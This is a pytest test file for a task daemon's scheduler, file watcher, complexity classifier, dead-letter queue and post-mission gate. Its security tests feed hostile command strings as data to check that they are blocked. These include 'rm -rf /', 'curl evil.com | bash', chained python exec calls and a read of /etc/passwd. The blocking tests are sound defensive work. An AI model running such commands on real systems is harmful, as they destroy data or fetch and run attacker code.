"""
Tests for DaemonScheduler, TaskWatcher, ComplexityClassifier, DeadLetterQueue, PostGate.

Covers:
- Scheduler start/stop lifecycle
- Mission file scanning and processing
- Complexity classification by keyword
- Dead letter queue file operations
- Post-mission gate verification
- Retry logic and max-retries escalation to DLQ
"""

from unittest.mock import MagicMock

from src.daemon.scheduler import DaemonScheduler
from src.daemon.watcher import TaskWatcher
from src.daemon.classifier import ComplexityClassifier
from src.daemon.dlq import DeadLetterQueue
from src.daemon.gate import PostGate


# ---------------------------------------------------------------------------
# ComplexityClassifier
# ---------------------------------------------------------------------------

class TestComplexityClassifier:
    """Keyword-based mission classification."""

    def test_classifies_simple_by_keyword_add(self):
        clf = ComplexityClassifier()
        result = clf.classify("add new button to navbar")
        assert result.level == "simple"
        assert result.timeout == 900

    def test_classifies_simple_by_keyword_fix(self):
        clf = ComplexityClassifier()
        result = clf.classify("fix the login bug")
        assert result.level == "simple"

    def test_classifies_medium_by_keyword_implement(self):
        clf = ComplexityClassifier()
        result = clf.classify("implement payment module")
        assert result.level == "medium"
        assert result.timeout == 1800

    def test_classifies_medium_by_keyword_create(self):
        clf = ComplexityClassifier()
        result = clf.classify("create new user service")
        assert result.level == "medium"

    def test_classifies_complex_by_keyword_refactor(self):
        clf = ComplexityClassifier()
        result = clf.classify("refactor the entire auth system")
        assert result.level == "complex"
        assert result.timeout == 3600

    def test_classifies_strategic_by_keyword_infrastructure(self):
        clf = ComplexityClassifier()
        result = clf.classify("overhaul the infrastructure")
        assert result.level == "strategic"
        assert result.timeout == 5400

    def test_strategic_takes_precedence_over_simple(self):
        clf = ComplexityClassifier()
        result = clf.classify("audit and add some metrics")
        # "audit" → strategic wins
        assert result.level == "strategic"

    def test_defaults_to_simple_when_no_keywords_match(self):
        clf = ComplexityClassifier()
        result = clf.classify("do the thing with stuff")
        assert result.level == "simple"
        assert result.timeout == 900

    def test_classification_result_includes_matched_keyword(self):
        clf = ComplexityClassifier()
        result = clf.classify("implement a search engine")
        assert result.matched_keyword == "implement"

    def test_default_result_has_no_matched_keyword(self):
        clf = ComplexityClassifier()
        result = clf.classify("some random text")
        assert result.matched_keyword is None

    def test_case_insensitive_matching(self):
        clf = ComplexityClassifier()
        result = clf.classify("REFACTOR the database layer")
        assert result.level == "complex"

    def test_custom_config_overrides_defaults(self):
        # Classifier iterates hardcoded levels ["strategic","complex","medium","simple"]
        # so custom config must use one of those level keys
        config = {
            "simple": {"keywords": ["urgent", "hotfix"], "timeout": 300},
        }
        clf = ComplexityClassifier(keyword_config=config)
        result = clf.classify("urgent hotfix needed now")
        assert result.level == "simple"
        assert result.timeout == 300


# ---------------------------------------------------------------------------
# TaskWatcher
# ---------------------------------------------------------------------------

class TestTaskWatcher:
    """Directory polling for mission files."""

    def test_scan_once_finds_mission_files(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        (watch_dir / "mission_001.txt").write_text("build feature A")
        (watch_dir / "mission_002.txt").write_text("fix bug B")
        watcher = TaskWatcher(watch_dir=str(watch_dir))
        found = watcher.scan_once()
        assert len(found) == 2

    def test_scan_once_ignores_non_matching_files(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        (watch_dir / "not_a_mission.py").write_text("code")
        (watch_dir / "mission_001.txt").write_text("actual mission")
        watcher = TaskWatcher(watch_dir=str(watch_dir), patterns=["mission_*.txt"])
        found = watcher.scan_once()
        assert len(found) == 1

    def test_mark_processed_excludes_from_next_scan(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        f = watch_dir / "mission_001.txt"
        f.write_text("task")
        watcher = TaskWatcher(watch_dir=str(watch_dir))
        missions = watcher.scan_once()
        watcher.mark_processed(missions[0])
        second_scan = watcher.scan_once()
        assert len(second_scan) == 0

    def test_archive_moves_file_to_processed(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        f = watch_dir / "mission_001.txt"
        f.write_text("task")
        watcher = TaskWatcher(watch_dir=str(watch_dir))
        missions = watcher.scan_once()
        dest = watcher.archive(missions[0])
        assert dest.exists()
        assert dest.parent.name == "processed"
        assert not f.exists()

    def test_archive_prevents_reprocessing(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        f = watch_dir / "mission_001.txt"
        f.write_text("task")
        watcher = TaskWatcher(watch_dir=str(watch_dir))
        missions = watcher.scan_once()
        watcher.archive(missions[0])
        assert watcher.scan_once() == []

    def test_scan_returns_empty_when_dir_empty(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        watcher = TaskWatcher(watch_dir=str(watch_dir))
        assert watcher.scan_once() == []

    def test_watcher_creates_dir_if_missing(self, tmp_path):
        new_dir = tmp_path / "new_tasks"
        assert not new_dir.exists()
        TaskWatcher(watch_dir=str(new_dir))
        assert new_dir.exists()

    def test_scan_returns_sorted_fifo_order(self, tmp_path):
        watch_dir = tmp_path / "tasks"
        watch_dir.mkdir()
        (watch_dir / "mission_001.txt").write_text("first")
        (watch_dir / "mission_002.txt").write_text("second")
        watcher = TaskWatcher(watch_dir=str(watch_dir))
        found = watcher.scan_once()
        names = [f.name for f in found]
        assert names == sorted(names)


# ---------------------------------------------------------------------------
# DeadLetterQueue
# ---------------------------------------------------------------------------

class TestDeadLetterQueue:
    """Failed mission file storage."""

    def test_move_to_dlq_creates_file(self, tmp_path):
        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir()
        dlq_dir = tmp_path / "dlq"
        mission = tasks_dir / "mission_fail.txt"
        mission.write_text("failed mission")
        dlq = DeadLetterQueue(dlq_dir=str(dlq_dir))
        dest = dlq.move_to_dlq(mission, reason="timeout exceeded")
        assert dest.exists()
        assert not mission.exists()

    def test_move_to_dlq_writes_reason_file(self, tmp_path):
        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir()
        dlq_dir = tmp_path / "dlq"
        mission = tasks_dir / "mission_fail.txt"
        mission.write_text("failed")
        dlq = DeadLetterQueue(dlq_dir=str(dlq_dir))
        dest = dlq.move_to_dlq(mission, reason="max retries exceeded")
        reason_file = dest.with_suffix(dest.suffix + ".reason")
        assert reason_file.exists()
        assert "max retries exceeded" in reason_file.read_text()

    def test_count_reflects_dlq_size(self, tmp_path):
        dlq_dir = tmp_path / "dlq"
        dlq = DeadLetterQueue(dlq_dir=str(dlq_dir))

        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir()
        for i in range(3):
            f = tasks_dir / f"mission_{i:03d}.txt"
            f.write_text(f"mission {i}")
            dlq.move_to_dlq(f)
        assert dlq.count == 3

    def test_list_dead_letters_excludes_reason_files(self, tmp_path):
        dlq_dir = tmp_path / "dlq"
        dlq_dir.mkdir()
        (dlq_dir / "mission_001.txt").write_text("mission")
        (dlq_dir / "mission_001.txt.reason").write_text("reason")
        dlq = DeadLetterQueue(dlq_dir=str(dlq_dir))
        items = dlq.list_dead_letters()
        assert len(items) == 1
        assert items[0].name == "mission_001.txt"

    def test_creates_dlq_dir_if_missing(self, tmp_path):
        dlq_dir = tmp_path / "deep" / "dlq"
        assert not dlq_dir.exists()
        DeadLetterQueue(dlq_dir=str(dlq_dir))
        assert dlq_dir.exists()


# ---------------------------------------------------------------------------
# DaemonScheduler
# ---------------------------------------------------------------------------

class TestDaemonScheduler:
    """Scheduler orchestrates watcher → classify → execute → gate → journal flow."""

    def _make_scheduler(self, tmp_path, allowed_commands=None):
        """Create scheduler with temp dirs and mocked heavy components.

        Uses 'echo' in the allowlist by default so test content like
        'echo hello world' passes the security gate.  Tests that need a
        broader or narrower allowlist can pass allowed_commands.
        """
        cfg = {
            "watch_dir": str(tmp_path / "tasks"),
            "poll_interval_secs": 0,
            "max_retries": 3,
            "working_dir": str(tmp_path),
            "journal_path": str(tmp_path / "daemon-journal.jsonl"),
            "dlq_dir": str(tmp_path / "dlq"),
            "allowed_commands": allowed_commands or {"echo"},
        }
        return DaemonScheduler(config=cfg)

    def test_stop_sets_running_false(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        scheduler._running = True
        scheduler.stop()
        assert scheduler._running is False

    def test_process_mission_success_archives_file(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        mission = tmp_path / "tasks" / "mission_001.txt"
        mission.parent.mkdir(parents=True, exist_ok=True)
        mission.write_text("echo feature X")

        scheduler.executor.run_shell = MagicMock(
            return_value=MagicMock(success=True, duration=1.0, exit_code=0, error=None)
        )
        scheduler.gate.check = MagicMock(return_value=True)
        scheduler.journal.record_mission = MagicMock()

        scheduler._process_mission(mission)

        # File should be archived (moved)
        assert not mission.exists()
        scheduler.journal.record_mission.assert_called_once()

    def test_process_mission_failure_retries(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        mission = tmp_path / "tasks" / "mission_002.txt"
        mission.parent.mkdir(parents=True, exist_ok=True)
        mission.write_text("echo service Y")

        scheduler.executor.run_shell = MagicMock(
            return_value=MagicMock(success=False, duration=0.5, exit_code=1, error="cmd failed")
        )
        scheduler.gate.check = MagicMock(return_value=False)

        scheduler._process_mission(mission)
        # First failure → retry count = 1, file stays
        assert scheduler._retry_counts.get(mission.name, 0) == 1

    def test_process_mission_moves_to_dlq_after_max_retries(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        scheduler._max_retries = 2
        mission = tmp_path / "tasks" / "mission_003.txt"
        mission.parent.mkdir(parents=True, exist_ok=True)
        mission.write_text("echo critical bug")

        scheduler.executor.run_shell = MagicMock(
            return_value=MagicMock(success=False, duration=0.1, exit_code=1, error="boom")
        )
        scheduler.gate.check = MagicMock(return_value=False)
        scheduler.dlq.move_to_dlq = MagicMock(return_value=tmp_path / "dlq" / mission.name)
        scheduler.journal.record_mission = MagicMock()

        # Process twice to hit max_retries=2
        scheduler._process_mission(mission)
        scheduler._process_mission(mission)

        scheduler.dlq.move_to_dlq.assert_called_once()
        # retry count entry cleaned up
        assert mission.name not in scheduler._retry_counts

    def test_process_mission_unreadable_file_does_not_crash(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        ghost = tmp_path / "tasks" / "ghost.txt"
        ghost.parent.mkdir(parents=True, exist_ok=True)
        # Do NOT create the file — it won't be readable
        scheduler._process_mission(ghost)  # Should not raise

    def test_status_returns_dict(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        scheduler.watcher.scan_once = MagicMock(return_value=[])
        # dlq.count is a @property — mock the list method it delegates to
        scheduler.dlq.list_dead_letters = MagicMock(return_value=[])
        scheduler.journal.success_rate = MagicMock(return_value=1.0)
        status = scheduler.status()
        assert "running" in status
        assert "watch_dir" in status
        assert "pending" in status
        assert "dead_letters" in status

    def test_handle_signal_stops_daemon(self, tmp_path):
        scheduler = self._make_scheduler(tmp_path)
        scheduler._running = True
        scheduler._handle_signal(15, None)
        assert scheduler._running is False

    def test_start_processes_mission_and_stops(self, tmp_path):
        """Integration: start runs one scan cycle then stops."""
        scheduler = self._make_scheduler(tmp_path)

        mission = tmp_path / "tasks" / "mission_start.txt"
        mission.parent.mkdir(parents=True, exist_ok=True)
        mission.write_text("echo test feature")

        call_count = {"n": 0}

        def fake_scan():
            call_count["n"] += 1
            if call_count["n"] == 1:
                return [mission]
            scheduler.stop()
            return []

        scheduler.watcher.scan_once = fake_scan
        scheduler.executor.run_shell = MagicMock(
            return_value=MagicMock(success=True, duration=0.1, exit_code=0, error=None)
        )
        scheduler.gate.check = MagicMock(return_value=True)
        scheduler.journal.record_mission = MagicMock()

        scheduler.start()  # Should terminate via stop()
        assert call_count["n"] >= 1


# ---------------------------------------------------------------------------
# Security gate tests
# ---------------------------------------------------------------------------

class TestDaemonSchedulerSecurity:
    """Security gate: sanitizer + allowlist before execution."""

    def _make_scheduler(self, tmp_path, allowed_commands=None):
        cfg = {
            "watch_dir": str(tmp_path / "tasks"),
            "poll_interval_secs": 0,
            "max_retries": 3,
            "working_dir": str(tmp_path),
            "journal_path": str(tmp_path / "daemon-journal.jsonl"),
            "dlq_dir": str(tmp_path / "dlq"),
            "allowed_commands": allowed_commands or {"echo"},
        }
        return DaemonScheduler(config=cfg)

    def _write_mission(self, tmp_path, name, content):
        mission = tmp_path / "tasks" / name
        mission.parent.mkdir(parents=True, exist_ok=True)
        mission.write_text(content)
        return mission

    def test_dangerous_content_dlq_not_executed(self, tmp_path):
        """Dangerous content 'rm -rf / && echo pwned' → DLQ, run_shell never called."""
        scheduler = self._make_scheduler(tmp_path)
        mission = self._write_mission(tmp_path, "mission_bad.txt", "rm -rf / && echo pwned")
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        # File moved to dlq
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_bad.txt").exists()
        reason_file = dlq_dir / "mission_bad.txt.reason"
        assert reason_file.exists()

    def test_multiline_content_dlq(self, tmp_path):
        """Multi-line content → DLQ (chaining/newline detected by sanitizer)."""
        scheduler = self._make_scheduler(tmp_path)
        mission = self._write_mission(
            tmp_path, "mission_multi.txt", "echo hello\necho world"
        )
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_multi.txt").exists()
        assert (dlq_dir / "mission_multi.txt.reason").exists()

    def test_allowed_command_runs_normally(self, tmp_path):
        """Content with allowlisted first token → run_shell called, archived on success."""
        scheduler = self._make_scheduler(tmp_path, allowed_commands={"echo"})
        mission = self._write_mission(tmp_path, "mission_echo.txt", "echo hello")

        scheduler.executor.run_shell = MagicMock(
            return_value=MagicMock(success=True, duration=0.5, exit_code=0, error=None)
        )
        scheduler.gate.check = MagicMock(return_value=True)
        scheduler.journal.record_mission = MagicMock()

        scheduler._process_mission(mission)

        scheduler.executor.run_shell.assert_called_once()
        assert not mission.exists()  # archived

    def test_not_in_allowlist_dlq(self, tmp_path):
        """Safe content but first token not in allowlist → DLQ with reason."""
        scheduler = self._make_scheduler(tmp_path, allowed_commands={"echo"})
        mission = self._write_mission(tmp_path, "mission_py.txt", "python3 script.py")
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_py.txt").exists()
        reason = (dlq_dir / "mission_py.txt.reason").read_text()
        assert "not in allowlist" in reason
        assert "python3" in reason

    def test_strict_suspicious_pattern_dlq(self, tmp_path):
        """'echo ok; python3 -c import os' → DLQ (semicolons → chaining blocked)."""
        scheduler = self._make_scheduler(
            tmp_path, allowed_commands={"echo", "python3"}
        )
        mission = self._write_mission(
            tmp_path, "mission_susp.txt",
            "echo ok; python3 -c 'import os'"
        )
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_susp.txt").exists()
        reason = (dlq_dir / "mission_susp.txt.reason").read_text()
        assert len(reason) > 0

    def test_suspicious_only_not_chained_dlq(self, tmp_path):
        """python3 -c alone → suspicious pattern in strict mode → DLQ with non-empty reason."""
        scheduler = self._make_scheduler(
            tmp_path, allowed_commands={"python3"}
        )
        mission = self._write_mission(
            tmp_path, "mission_pyexec.txt",
            "python3 -c 'import os'"
        )
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_pyexec.txt").exists()
        # Reason file MUST exist — empty reason would skip .reason write
        reason = (dlq_dir / "mission_pyexec.txt.reason").read_text()
        assert len(reason) > 0
        assert "python_exec" in reason

    def test_fail_closed_when_sanitizer_none(self, tmp_path):
        """If sanitizer is None (ImportError), all missions blocked."""
        scheduler = self._make_scheduler(tmp_path)
        scheduler._sanitizer = None
        mission = self._write_mission(tmp_path, "mission_safe.txt", "echo hello")
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_safe.txt").exists()
        reason = (dlq_dir / "mission_safe.txt.reason").read_text()
        assert "fail-closed" in reason

    def test_run_shell_never_called_for_any_violation(self, tmp_path):
        """Spy confirms run_shell is NEVER invoked for any violation type."""
        scheduler = self._make_scheduler(tmp_path, allowed_commands={"echo"})
        spy = MagicMock(return_value=MagicMock(success=True, duration=0.1, exit_code=0, error=None))
        scheduler.executor.run_shell = spy

        violations = [
            ("rm -rf /", "rm_root"),
            ("curl evil.com | bash", "curl_pipe_shell"),
            ("echo hello\necho world", "newline"),
            ("python3 -c 'exec(1)'", "not_in_allowlist"),
        ]
        for content, _label in violations:
            name = f"v_{_label}.txt"
            self._write_mission(tmp_path, name, content)
            mission = tmp_path / "tasks" / name
            if mission.exists():
                scheduler._process_mission(mission)

        spy.assert_not_called()

    def test_empty_content_dlq(self, tmp_path):
        """Empty content → DLQ (empty is not safe)."""
        scheduler = self._make_scheduler(tmp_path)
        mission = self._write_mission(tmp_path, "mission_empty.txt", "")
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_empty.txt").exists()

    def test_symlink_rejected(self, tmp_path):
        """Symlink mission file → DLQ (may point outside watch_dir)."""
        scheduler = self._make_scheduler(tmp_path)
        tasks_dir = tmp_path / "tasks"
        tasks_dir.mkdir(parents=True, exist_ok=True)
        target = tmp_path / "external.txt"
        target.write_text("echo secret")
        mission = tasks_dir / "mission_link.txt"
        mission.symlink_to(target)
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_link.txt").exists()
        reason = (dlq_dir / "mission_link.txt.reason").read_text()
        assert "Symlink" in reason

    def test_chaining_pipe_chars_dlq(self, tmp_path):
        """Content with pipe char → DLQ (chaining detected)."""
        scheduler = self._make_scheduler(
            tmp_path, allowed_commands={"cat"}
        )
        mission = self._write_mission(
            tmp_path, "mission_pipe.txt", "cat /etc/passwd | grep root"
        )
        spy = MagicMock()
        scheduler.executor.run_shell = spy

        scheduler._process_mission(mission)

        spy.assert_not_called()
        dlq_dir = tmp_path / "dlq"
        assert (dlq_dir / "mission_pipe.txt").exists()


# ---------------------------------------------------------------------------
# PostGate
# ---------------------------------------------------------------------------

class TestPostGate:
    """Gate verifies commands pass after mission."""

    def test_no_commands_always_passes(self):
        gate = PostGate(verify_commands=[])
        assert gate.check() is True

    def test_all_passing_commands_passes_gate(self):
        gate = PostGate(verify_commands=["echo ok"])
        mock_result = MagicMock(success=True, exit_code=0)
        gate._executor.run_shell = MagicMock(return_value=mock_result)
        assert gate.check() is True

    def test_single_failing_command_fails_gate(self):
        gate = PostGate(verify_commands=["npm test", "npm build"])
        results = [
            MagicMock(success=True, exit_code=0),
            MagicMock(success=False, exit_code=1),
        ]
        gate._executor.run_shell = MagicMock(side_effect=results)
        assert gate.check() is False

    def test_check_detailed_returns_all_results(self):
        gate = PostGate(verify_commands=["cmd1", "cmd2"])
        results = [
            MagicMock(success=True, exit_code=0),
            MagicMock(success=False, exit_code=1),
        ]
        gate._executor.run_shell = MagicMock(side_effect=results)
        detailed = gate.check_detailed()
        assert len(detailed) == 2
